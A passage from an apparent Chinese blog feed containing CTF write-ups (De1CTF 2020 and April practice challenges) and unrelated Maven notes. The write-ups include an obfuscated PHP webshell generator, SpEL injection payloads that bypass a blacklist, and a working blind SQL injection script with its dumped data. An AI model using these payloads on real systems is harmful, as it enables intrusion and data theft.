$data;}$a=&#39;&lt;?=[($_=[]),($_=@&quot;$_&quot;),($___=$_[(&quot;!&quot;!=&quot;!&quot;)]),($____=$_[(&quot;!&quot;==&quot;!&quot;)+(&quot;!&quot;==&quot;!&quot;)+(&quot;!&quot;==&quot;!&quot;)]),&#39;.fuck($b).&#39;$_____=$__]?&gt;&#39;;//system$a.=&#39;&lt;?=[($__=&quot;_&quot;),($_=[]),($_=@&quot;$_&quot;),&#39;.fuck($c).&#39;$_]?&gt;&#39;;//_POST$a.=&#39;&lt;?=[($_____($$__[_]))]?&gt;&#39;;echo $a;</code></pre><h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><pre><code>GET /spel/calc?calc=&#39;1&#39;%2b&#39;1&#39; =&gt; 11GET /spel/calc?calc=&#39;1&#39;.length  {&quot;timestamp&quot;:&quot;2020-05-05T07:23:42.244+0000&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;EL1008E: Property or field &#39;length&#39; cannot be found on object of type &#39;java.lang.String&#39; - maybe not public or not valid?&quot;,&quot;path&quot;:&quot;/spel/calc&quot;}</code></pre><p>谷歌一段时间后发现这里使用spel(Spring 表达式语言  Spring Expression Language )来计算的</p><p>黑名单：<code>getClass,String,#,new,T(,reader</code></p><pre><code>&#39;&#39;.class.forName(&#39;java.l&#39;%2b&#39;ang.Ru&#39;%2b&#39;ntime&#39;).getMethod(&#39;ex&#39;%2b&#39;ec&#39;,&#39;&#39;.class)</code></pre><p>原本想那shell的后来看到OpenRASP,想想还是直接读取文件方便一点</p><p>构造payload:</p><p><code>neW+java.io.RandomAccessFile(&#39;/flag&#39;,&#39;r&#39;).readLine()</code></p><p>SpEL中除了java.lang下的类，其他的类在实例化的是否需要完整的包名</p><p>flag:<code>De1CTF{NobodyKnowsMoreThanTrumpAboutJava}</code></p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/05/06/de1ctf2020/">https://www.ccreater.top/2020/05/06/de1ctf2020/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>maven学习笔记</title>
      <link href="2020/05/05/maven%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>2020/05/05/maven%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="maven学习笔记"><a href="#maven学习笔记" class="headerlink" title="maven学习笔记"></a>maven学习笔记</h1><h2 id="学习网站"><a href="#学习网站" class="headerlink" title="学习网站"></a>学习网站</h2><p> <a href="https://www.imooc.com/learn/443" target="_blank" rel="noopener">https://www.imooc.com/learn/443</a> (这个挺好的)</p><p> <a href="https://www.runoob.com/maven/maven-tutorial.html" target="_blank" rel="noopener">https://www.runoob.com/maven/maven-tutorial.html</a> </p><h2 id="maven功能"><a href="#maven功能" class="headerlink" title="maven功能"></a>maven功能</h2><ul><li>构建</li><li>文档生成</li><li>报告</li><li>依赖</li><li>SCMs</li><li>发布</li><li>分发</li><li>邮件列表</li></ul><h2 id="约定配置"><a href="#约定配置" class="headerlink" title="约定配置"></a>约定配置</h2><p>Maven 提倡使用一个共同的标准目录结构，Maven 使用约定优于配置的原则，大家尽可能的遵守这样的目录结构。如下所示：</p><table><thead><tr><th align="left">目录</th><th align="left">目的</th></tr></thead><tbody><tr><td align="left">${basedir}</td><td align="left">存放pom.xml和所有的子目录</td></tr><tr><td align="left">${basedir}/src/main/java</td><td align="left">项目的java源代码</td></tr><tr><td align="left">${basedir}/src/main/resources</td><td align="left">项目的资源，比如说property文件，springmvc.xml</td></tr><tr><td align="left">${basedir}/src/test/java</td><td align="left">项目的测试类，比如说Junit代码</td></tr><tr><td align="left">${basedir}/src/test/resources</td><td align="left">测试用的资源</td></tr><tr><td align="left">${basedir}/src/main/webapp/WEB-INF</td><td align="left">web应用文件目录，web项目的信息，比如存放web.xml、本地图片、jsp视图页面</td></tr><tr><td align="left">${basedir}/target</td><td align="left">打包输出目录</td></tr><tr><td align="left">${basedir}/target/classes</td><td align="left">编译输出目录</td></tr><tr><td align="left">${basedir}/target/test-classes</td><td align="left">测试编译输出目录</td></tr><tr><td align="left">Test.java</td><td align="left">Maven只会自动运行符合该命名规则的测试类</td></tr><tr><td align="left">~/.m2/repository</td><td align="left">Maven默认的本地仓库目录位置</td></tr></tbody></table><h2 id="Maven-POM"><a href="#Maven-POM" class="headerlink" title="Maven POM"></a>Maven POM</h2><p> POM( Project Object Model，项目对象模型 ) 是 Maven 工程的基本工作单元，是一个XML文件 ,用于描述如何构建项目</p><p>在创建 POM 之前，我们首先需要描述项目组 (groupId), 项目的唯一ID。 </p><h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><pre><code class="xml">&lt;project xmlns = &quot;http://maven.apache.org/POM/4.0.0&quot;    xmlns:xsi = &quot;http://www.w3.org/2001/XMLSchema-instance&quot;    xsi:schemaLocation = &quot;http://maven.apache.org/POM/4.0.0    http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;    &lt;!-- 模型版本 --&gt;    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;    &lt;!-- 公司或者组织的唯一标志，并且配置时生成的路径也是由此生成， 如com.companyname.project-group，maven会将该项目打成的jar包放本地路径：/com/companyname/project-group --&gt;    &lt;groupId&gt;com.companyname.project-group(公司网站反写+项目名)&lt;/groupId&gt;    &lt;!-- 项目的唯一ID，一个groupId下面可能多个项目，就是靠artifactId来区分的 --&gt;    &lt;artifactId&gt;project+模块名&lt;/artifactId&gt;    &lt;!-- 版本号 --&gt;    &lt;version&gt;1.0&lt;/version&gt;&lt;/project&gt;</code></pre><h3 id="常见标签解释"><a href="#常见标签解释" class="headerlink" title="常见标签解释"></a>常见标签解释</h3><pre><code class="xml">&lt;project xmlns = &quot;http://maven.apache.org/POM/4.0.0&quot;    xmlns:xsi = &quot;http://www.w3.org/2001/XMLSchema-instance&quot;    xsi:schemaLocation = &quot;http://maven.apache.org/POM/4.0.0    http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;    &lt;!-- 模型版本 --&gt;    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;    &lt;!-- 公司或者组织的唯一标志，并且配置时生成的路径也是由此生成， 如com.companyname.project-group，maven会将该项目打成的jar包放本地路径：/com/companyname/project-group --&gt;    &lt;groupId&gt;com.companyname.project-group(公司网站反写+项目名)&lt;/groupId&gt;    &lt;!-- 项目的唯一ID，一个groupId下面可能多个项目，就是靠artifactId来区分的 --&gt;    &lt;artifactId&gt;project+模块名&lt;/artifactId&gt;    &lt;!-- 版本号     第一个数字表示大版本号    第二个数字表示分支版本号    第三个数字表示小版本号    snapshot 快照    alpha 内部测试    beta 公测    Release 稳定版本    GA 正式发布    --&gt;    &lt;version&gt;1.0.0-xxx&lt;/version&gt;    &lt;!-- 打包方式，默认是jar,还有:war zip pom--&gt;    &lt;packaging&gt;&lt;/packaging&gt;    &lt;!--项目描述名--&gt;    &lt;name&gt;&lt;/name&gt;    &lt;!--项目地址 --&gt;    &lt;url&gt;&lt;/url&gt;    &lt;!--项目描述 --&gt;    &lt;descriptions&gt;&lt;/descriptions&gt;    &lt;!--开发人员信息 --&gt;    &lt;developers&gt;&lt;/developers&gt;    &lt;dependeies&gt;        &lt;dependency&gt;            &lt;groupId&gt;com.companyname.project-group(公司网站反写+项目名)&lt;/groupId&gt;            &lt;artifactId&gt;project+模块名&lt;/artifactId&gt;            &lt;version&gt;1.0.0-xxx&lt;/version&gt;            &lt;type&gt;&lt;/type&gt;            &lt;!-- 在test中有用 --&gt;            &lt;scope&gt;test&lt;/scope&gt;            &lt;!--设置依赖是否可选，默认False，设为False则子项目默认继承，否则得显示声明--&gt;            &lt;optional&gt;&lt;/optional&gt;            &lt;!-- 排除依赖传递列表                如A依赖B，B依赖C，而A不依赖C，此时就可以在此处添加C，来排除依赖             --&gt;            &lt;exclusions&gt;                &lt;exclusion&gt;                &lt;/exclusion&gt;            &lt;/exclusions&gt;        &lt;/dependency&gt;    &lt;/dependeies&gt;    &lt;!-- 依赖的管理，子pom自动继承，但是本身并不依赖 --&gt;    &lt;dependencyManagement&gt;       &lt;dependeies&gt;            &lt;dependency&gt;           &lt;/dependency&gt;        &lt;/dependeies&gt;     &lt;/dependencyManagement&gt;    &lt;build&gt;        &lt;plugins&gt;            &lt;!-- 详情见在某个阶段使用插件 --&gt;        &lt;/plugins&gt;    &lt;/build&gt;    &lt;!-- 聚合运行多个maven项目,一口气全部编译 --&gt;    &lt;modules&gt;        &lt;module&gt;        &lt;/module&gt;    &lt;/modules&gt;&lt;/project&gt;</code></pre><h3 id="执行main函数"><a href="#执行main函数" class="headerlink" title="执行main函数"></a>执行main函数</h3><p>在pom下的project添加：</p><pre><code class="xml">&lt;build&gt; &lt;plugins&gt;  &lt;plugin&gt;   &lt;groupId&gt;org.codehaus.mojo&lt;/groupId&gt;   &lt;artifactId&gt;exec-maven-plugin&lt;/artifactId&gt;   &lt;version&gt;1.1.1&lt;/version&gt;   &lt;executions&gt;    &lt;execution&gt;     &lt;phase&gt;test&lt;/phase&gt;     &lt;goals&gt;      &lt;goal&gt;java&lt;/goal&gt;     &lt;/goals&gt;     &lt;configuration&gt;      &lt;mainClass&gt;com.vineetmanohar.module.CodeGenerator&lt;/mainClass&gt;      &lt;arguments&gt;       &lt;argument&gt;arg0&lt;/argument&gt;       &lt;argument&gt;arg1&lt;/argument&gt;      &lt;/arguments&gt;     &lt;/configuration&gt;    &lt;/execution&gt;   &lt;/executions&gt;  &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt;</code></pre><h3 id="依赖范围"><a href="#依赖范围" class="headerlink" title="依赖范围"></a>依赖范围</h3><ul><li>compile<br>默认的范围，编译测试运行都有效</li><li>provided<br>在测试和编译时有效</li><li>runtime<br>在测试和运行时有效</li><li>test<br>只有在测试中有效</li></ul><h3 id="排除依赖"><a href="#排除依赖" class="headerlink" title="排除依赖"></a>排除依赖</h3><p>在pom中的project下添加</p><pre><code class="xml">&lt;!-- 排除依赖传递列表                如A依赖B，B依赖C，而A不依赖C，此时就可以在此处添加C，来排除依赖             --&gt;            &lt;exclusions&gt;                &lt;exclusion&gt;                &lt;/exclusion&gt;            &lt;/exclusions&gt;</code></pre><h3 id="依赖冲突解决原则"><a href="#依赖冲突解决原则" class="headerlink" title="依赖冲突解决原则"></a>依赖冲突解决原则</h3><h4 id="短路优先"><a href="#短路优先" class="headerlink" title="短路优先"></a>短路优先</h4><pre><code>A -&gt; B -&gt; C -&gt; X1A -&gt; D -&gt; X2#A -&gt; D代表 A依赖于D此时A依赖于X2</code></pre><h4 id="先声明先优先"><a href="#先声明先优先" class="headerlink" title="先声明先优先"></a>先声明先优先</h4><p>如果路径长度相同(依赖链)，则谁先声明，先解析谁</p><h3 id="聚合"><a href="#聚合" class="headerlink" title="聚合"></a>聚合</h3><p>在容器pom中修改packaging为pom，添加modules</p><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>现有maven项目:maven01和maven02</p><p>新建maven项目：maven03,三个项目均在同一个文件夹下</p><p>在maven03中修改packaging为pom，添加如下modules</p><pre><code class="xml">&lt;modules&gt;    &lt;module&gt;        ../maven01    &lt;/module&gt;    &lt;module&gt;        ../maven02    &lt;/module&gt;&lt;/modules&gt;</code></pre><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p>当多个maven模块都依赖一个相同的库时，多次声明显得太麻烦此时可以用继承来解决</p><h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><p>现有两个maven项目(maven01,maven02)都使用junit:3.8.1</p><p>新建父maven项目:maven03，其对应的pom文件为：</p><pre><code class="xml">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;  xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;  &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;  &lt;groupId&gt;top.ccreater&lt;/groupId&gt;  &lt;artifactId&gt;maven03&lt;/artifactId&gt;  &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;  &lt;packaging&gt;pom&lt;/packaging&gt;  &lt;name&gt;maven03&lt;/name&gt;  &lt;url&gt;http://maven.apache.org&lt;/url&gt;  &lt;properties&gt;    &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;  &lt;/properties&gt;    &lt;dependencyManagement&gt;      &lt;dependencies&gt;        &lt;dependency&gt;          &lt;groupId&gt;junit&lt;/groupId&gt;          &lt;artifactId&gt;junit&lt;/artifactId&gt;          &lt;version&gt;3.8.1&lt;/version&gt;          &lt;scope&gt;test&lt;/scope&gt;        &lt;/dependency&gt;          &lt;/dependencies&gt;    &lt;/dependencyManagement&gt;&lt;/project&gt;</code></pre><p>将相同的依赖都添加到dependencyManagement下，并修改packaging为pom</p><p>maven01和maven02的pom文件均为：</p><pre><code class="xml">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;  xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;  &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;  &lt;groupId&gt;top.ccreater&lt;/groupId&gt;  &lt;artifactId&gt;maven02&lt;/artifactId&gt;  &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;  &lt;packaging&gt;jar&lt;/packaging&gt;  &lt;name&gt;maven02&lt;/name&gt;  &lt;url&gt;http://maven.apache.org&lt;/url&gt;  &lt;properties&gt;    &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;  &lt;/properties&gt;    &lt;parent&gt;      &lt;groupId&gt;top.ccreater&lt;/groupId&gt;      &lt;artifactId&gt;maven03(/maven02)&lt;/artifactId&gt;      &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;    &lt;/parent&gt;  &lt;dependencies&gt;    &lt;dependency&gt;      &lt;groupId&gt;junit&lt;/groupId&gt;      &lt;artifactId&gt;junit&lt;/artifactId&gt;    &lt;/dependency&gt;  &lt;/dependencies&gt;&lt;/project&gt;</code></pre><h3 id="Super-POM"><a href="#Super-POM" class="headerlink" title="Super POM"></a>Super POM</h3><p>所有的 POM 都继承自一个父 POM（无论是否显式定义了这个父 POM）。父 POM 也被称作 <strong>Super POM</strong>，它包含了一些可以被继承的默认设置。</p><p>Maven 使用 effective pom（Super pom 加上工程自己的配置）来执行相关的目标，它帮助开发者在 pom.xml 中做尽可能少的配置，当然这些配置可以被方便的重写。</p><p>查看 Super POM 默认配置的一个简单方法是执行以下命令：<strong>mvn help:effective-pom</strong> （需要在当前目录下新建一个pom.xml）</p><h3 id="POM-标签详解"><a href="#POM-标签详解" class="headerlink" title="POM 标签详解"></a>POM 标签详解</h3><p><a href="https://www.runoob.com/maven/maven-pom.html" target="_blank" rel="noopener">https://www.runoob.com/maven/maven-pom.html</a></p><h2 id="Maven-构建生命周期"><a href="#Maven-构建生命周期" class="headerlink" title="Maven 构建生命周期"></a>Maven 构建生命周期</h2><p> Maven 构建生命周期定义了一个项目构建跟发布的过程。 </p><p>Maven 有以下三个标准的生命周期：</p><ul><li><strong>clean</strong>：项目清理的处理</li><li><strong>default(或 build)</strong>：项目部署的处理</li><li><strong>site</strong>：项目站点文档创建的处理</li></ul><h3 id="典型的生命构建周期"><a href="#典型的生命构建周期" class="headerlink" title="典型的生命构建周期"></a>典型的生命构建周期</h3><table><thead><tr><th align="left">阶段</th><th align="left">处理</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">验证 validate</td><td align="left">验证项目</td><td align="left">验证项目是否正确且所有必须信息是可用的</td></tr><tr><td align="left">编译 compile</td><td align="left">执行编译</td><td align="left">源代码编译在此阶段完成</td></tr><tr><td align="left">测试 Test</td><td align="left">测试</td><td align="left">使用适当的单元测试框架（例如JUnit）运行测试。</td></tr><tr><td align="left">包装 package</td><td align="left">打包</td><td align="left">创建JAR/WAR包如在 pom.xml 中定义提及的包</td></tr><tr><td align="left">检查 verify</td><td align="left">检查</td><td align="left">对集成测试的结果进行检查，以保证质量达标</td></tr><tr><td align="left">安装 install</td><td align="left">安装</td><td align="left">安装打包的项目到本地仓库，以供其他项目使用</td></tr><tr><td align="left">部署 deploy</td><td align="left">部署</td><td align="left">拷贝最终的工程包到远程仓库中，以共享给其他开发人员和工程</td></tr></tbody></table><p>如果执行package，那么clean,test等都会被执行</p><h3 id="构建阶段由插件目标构成"><a href="#构建阶段由插件目标构成" class="headerlink" title="构建阶段由插件目标构成"></a>构建阶段由插件目标构成</h3><p> 一个插件目标代表一个特定的任务（比构建阶段更为精细），这有助于项目的构建和管理。这些目标可能被绑定到多个阶段或者无绑定。不绑定到任何构建阶段的目标可以在构建生命周期之外通过直接调用执行。这些目标的执行顺序取决于调用目标和构建阶段的顺序。 </p><p>插件目标解释： 一个插件有多个目标，每个功能就是一个<em>插件目标</em>，所以一个插件有多个功能。 </p><h2 id="maven-常用命令"><a href="#maven-常用命令" class="headerlink" title="maven 常用命令"></a>maven 常用命令</h2><pre><code class="shell">mvn -vmvn compile 编译mvn test 测试mvn package 打包项目生成jar文件mvn clearn 删除target 目录mvn install 安装jar包到本地仓库创建目录的两种方式1. 交互式mvn archetype:generate 2. 非交互式mvn archetype:generate -DgroupId=com.companyname.bank -DartifactId=consumerBanking -DarchetypeArtifactId=maven-archetype-quickstart -DinteractiveMode=false</code></pre><h2 id="在某个阶段使用插件"><a href="#在某个阶段使用插件" class="headerlink" title="在某个阶段使用插件"></a>在某个阶段使用插件</h2><p> <a href="http://maven.apache.org/plugins" target="_blank" rel="noopener">http://maven.apache.org/plugins</a> </p><p>各个插件下有个example config如： <a href="http://maven.apache.org/plugins/maven-source-plugin/" target="_blank" rel="noopener">http://maven.apache.org/plugins/maven-source-plugin/</a> </p><p>在pom.xml文件中project下添加</p><pre><code class="xml">&lt;build&gt;    &lt;plugins&gt;      &lt;plugin&gt;        &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;        &lt;artifactId&gt;maven-source-plugin&lt;/artifactId&gt;        &lt;version&gt;3.2.0&lt;/version&gt;        &lt;!--  &lt;configuration&gt;          &lt;outputDirectory&gt;/absolute/path/to/the/output/directory&lt;/outputDirectory&gt;          &lt;finalName&gt;filename-of-generated-jar-file&lt;/finalName&gt;          &lt;attach&gt;false&lt;/attach&gt;        &lt;/configuration&gt;--&gt;        &lt;executions&gt;            &lt;execution&gt;                &lt;phase&gt;package&lt;/phase&gt;                &lt;goals&gt;                &lt;goal&gt;jar-no-fork&lt;/goal&gt;                &lt;!-- 在package阶段执行source:jar-no-fork --&gt;            &lt;/goals&gt;            &lt;/execution&gt;        &lt;/executions&gt;      &lt;/plugin&gt;    &lt;/plugins&gt;  &lt;/build&gt;</code></pre><h2 id="maven配置文件"><a href="#maven配置文件" class="headerlink" title="maven配置文件"></a>maven配置文件</h2><h3 id="添加镜像仓库"><a href="#添加镜像仓库" class="headerlink" title="添加镜像仓库"></a>添加镜像仓库</h3><p>在mirrors下添加</p><pre><code class="xml">&lt;mirror&gt;        &lt;id&gt;alimaven&lt;/id&gt;        &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;&lt;!-- 哪个仓库的镜像，利用*来匹配所有仓库 --&gt;        &lt;name&gt;aliyun maven&lt;/name&gt;        &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt;    &lt;/mirror&gt;    &lt;mirror&gt;        &lt;id&gt;jcenter&lt;/id&gt;        &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;        &lt;name&gt;jcenter.bintray.com&lt;/name&gt;        &lt;url&gt;http://jcenter.bintray.com/&lt;/url&gt;    &lt;/mirror&gt;    &lt;mirror&gt;        &lt;id&gt;repo1&lt;/id&gt;        &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;        &lt;name&gt;Human Readable Name for this Mirror.&lt;/name&gt;        &lt;url&gt;http://repo1.maven.org/maven2/&lt;/url&gt;    &lt;/mirror&gt;    &lt;mirror&gt;        &lt;id&gt;repo2&lt;/id&gt;        &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;        &lt;name&gt;Human Readable Name for this Mirror.&lt;/name&gt;        &lt;url&gt;http://repo2.maven.org/maven2/&lt;/url&gt;    &lt;/mirror&gt;</code></pre><h3 id="修改本地仓库地址"><a href="#修改本地仓库地址" class="headerlink" title="修改本地仓库地址"></a>修改本地仓库地址</h3><p>修改<code>&lt;localRepository&gt;E:/apache-maven-3.6.3/repository&lt;/localRepository&gt;</code></p><h2 id="常用插件介绍"><a href="#常用插件介绍" class="headerlink" title="常用插件介绍"></a>常用插件介绍</h2><p> jetty : servlet 本地测试插件</p><p> <a href="http://tomcat.apache.org/maven-plugin.html" target="_blank" rel="noopener">tomcat</a>  :  tomcat  本地测试插件</p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/05/05/maven学习笔记/">https://www.ccreater.top/2020/05/05/maven学习笔记/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>4月做题</title>
      <link href="2020/05/05/4%E6%9C%88%E5%81%9A%E9%A2%98/"/>
      <url>2020/05/05/4%E6%9C%88%E5%81%9A%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="4月做题"><a href="#4月做题" class="headerlink" title="4月做题"></a>4月做题</h1><h2 id="happyctfd"><a href="#happyctfd" class="headerlink" title="happyctfd"></a>happyctfd</h2><p>刚开始看这个非常怕…后来谷歌了一下ctfd的cve直接打穿,这题就是弟弟</p><p> <a href="https://copyfuture.com/blogs-details/20200305225221297r8myv7xpvv0lqr0" target="_blank" rel="noopener">https://copyfuture.com/blogs-details/20200305225221297r8myv7xpvv0lqr0</a> </p><p>登陆后台后把数据导出就拿到flag了</p><p><code>flag{1b236e8e-8f64-461d-a973-7059e706aeec}</code></p><h2 id="finalsql"><a href="#finalsql" class="headerlink" title="finalsql"></a>finalsql</h2><p>有两处注入点</p><p>第一处:</p><p><code>/search.php?id=1</code></p><p>黑名单:<code>hex,if, ,and</code></p><p>payload:<code>/search.php?id=1/(((select(ord(substr(group_concat(table_name),20,1)))from(information_schema.tables)where(table_schema=database()))-31)&gt;0)</code></p><p>盲注脚本:</p><pre><code class="python">import requestsimport time#修改bigger和sqlinj就好#实现bigger才能使用def findByDichotomy(begin,end):    max_num=end    while True:        mid=int((begin+end)/2)        if begin==max_num:            return False        if begin==end:            return begin        if end-begin==1:            if bigger(begin):                return end            else:                return begin        if bigger(mid):            begin=mid+1        else:            end=mid#待求数据大于numdef bigger(num):    return sqlinj(num)def less(num):    passdef equal(num):    passdef sqlinj(num):    burp0_url = &quot;http://ff83c0e6-205f-4296-a512-fe2919cdeda4.node3.buuoj.cn:80/search.php?id=1/(((select(ord(substr(group_concat(username,&#39;,&#39;,password),POS,1)))from(F1naI1y))-GUESS)&gt;0)&quot;.replace(&quot;GUESS&quot;,str(num)).replace(&quot;POS&quot;,str(pos))    burp0_headers = {&quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://ff83c0e6-205f-4296-a512-fe2919cdeda4.node3.buuoj.cn/&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}    res=requests.get(burp0_url, headers=burp0_headers)    time.sleep(0.5)    print(&quot;test &quot;,num)    if &quot;NO! Not this! Click others~~~&quot; in res.text:        return True    else:        return Falseresult=&quot;mygod,cl4y_is_really_amazing,welcome,welcome_to_my_blog,site,http://www.cl4y.top,site,http://www.cl4y.top,site&quot;pos=len(result)+1while True:    num=findByDichotomy(32,128)    if num is False:        print(result)        break    result+=chr(num)    print(result)    pos+=1</code></pre><p>数据库:information_schema,test,performance_schema,mysql,geek</p><pre><code>F1naI1y,FlaaaaagFlaaaaag:id,fl4gawsF1naI1y:id,username,passwordmygod,cl4y_is_really_amazing,welcome,welcome_to_my_blog,site,http://www.cl4y.top,site,http://www.cl4y.top,site,http://www.cl4y.top,site,http://www.cl4y.top,Syc,welcom_to_Syclover,finally,cl4y_really_need_a_grilfriend,flag,flag{2e7c980e-7fff-443b-8d1a-1371eaa326ba}</code></pre><p>测试后第二次发现不如第一处好用,就不写了</p><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><pre><code class="python">from flask import Flask, requestimport osapp = Flask(__name__)flag_file = open(&quot;flag.txt&quot;, &quot;r&quot;)# flag = flag_file.read()# flag_file.close()## @app.route(&#39;/flag&#39;)# def flag():#     return flag## want flag? naive!# You will never find the thing you want:) I think@app.route(&#39;/shell&#39;)def shell():    os.system(&quot;rm -f flag.txt&quot;)    exec_cmd = request.args.get(&#39;c&#39;)    os.system(exec_cmd)    return &quot;1&quot;@app.route(&#39;/&#39;)def source():    return open(&quot;app.py&quot;,&quot;r&quot;).read()if __name__ == &quot;__main__&quot;:    app.run(host=&#39;0.0.0.0&#39;)</code></pre><p>去fd找flag</p><p><code>flag{7410ef7f-b10e-4da4-9beb-29f304fec028}</code></p><p>so easy</p><h2 id="blanklist"><a href="#blanklist" class="headerlink" title="blanklist"></a>blanklist</h2><p>堆叠注入,handle代替select</p><p><code>flag{dad3eb12-8877-4ea8-8bfe-98ac99a93715}</code></p><h2 id="枯燥的抽奖"><a href="#枯燥的抽奖" class="headerlink" title="枯燥的抽奖"></a>枯燥的抽奖</h2><pre><code class="php">&lt;?php#这不是抽奖程序的源代码！不许看！header(&quot;Content-Type: text/html;charset=utf-8&quot;);session_start();if(!isset($_SESSION[&#39;seed&#39;])){$_SESSION[&#39;seed&#39;]=rand(0,999999999);}mt_srand($_SESSION[&#39;seed&#39;]);$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str=&#39;&#39;;$len1=20;for ( $i = 0; $i &lt; $len1; $i++ ){    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       }$str_show = substr($str, 0, 10);echo &quot;&lt;p id=&#39;p1&#39;&gt;&quot;.$str_show.&quot;&lt;/p&gt;&quot;;if(isset($_POST[&#39;num&#39;])){    if($_POST[&#39;num&#39;]===$str){x        echo &quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}&lt;/p&gt;&quot;;    }    else{        echo &quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;;    }}show_source(&quot;check.php&quot;);</code></pre><p>用php_mt_rand来爆破</p><p><code>flag{1c171630-aee4-400c-b629-a9e457cbe15e}</code></p><p>一定要去<code>https://www.openwall.com/php_mt_seed/</code>下载,不要去github的镜像下载,把我坑死了</p><h2 id="comment"><a href="#comment" class="headerlink" title="comment"></a>comment</h2><pre><code class="php">&lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION[&#39;login&#39;] != &#39;yes&#39;){    header(&quot;Location: ./login.php&quot;);    die();}if(isset($_GET[&#39;do&#39;])){switch ($_GET[&#39;do&#39;]){case &#39;write&#39;:    $category = addslashes($_POST[&#39;category&#39;]);    $title = addslashes($_POST[&#39;title&#39;]);    $content = addslashes($_POST[&#39;content&#39;]);    $sql = &quot;insert into board            set category = &#39;$category&#39;,                title = &#39;$title&#39;,                content = &#39;$content&#39;&quot;;#category=result&#39; ,bo_id=&#39;1\    $result = mysql_query($sql);    header(&quot;Location: ./index.php&quot;);    break;case &#39;comment&#39;:    $bo_id = addslashes($_POST[&#39;bo_id&#39;]);    $sql = &quot;select category from board where id=&#39;$bo_id&#39;&quot;;    $result = mysql_query($sql);    $num = mysql_num_rows($result);    if($num&gt;0){    $category = mysql_fetch_array($result)[&#39;category&#39;];    $content = addslashes($_POST[&#39;content&#39;]);    $sql = &quot;insert into comment            set category = &#39;$category&#39;,                content = &#39;$content&#39;,                bo_id = &#39;$bo_id&#39;&quot;;#insert into comment set category = &#39;result&#39; bo_id=&#39;1\&#39;,content=&#39;&#39;,bo_id=&#39;xxx&#39;;    $result = mysql_query($sql);    }    header(&quot;Location: ./comment.php?id=$bo_id&quot;);    break;default:    header(&quot;Location: ./index.php&quot;);}}else{    header(&quot;Location: ./index.php&quot;);}?&gt;</code></pre><p>需要登陆才能留言</p><p>爆破可知: zhangwei / zhangwei666 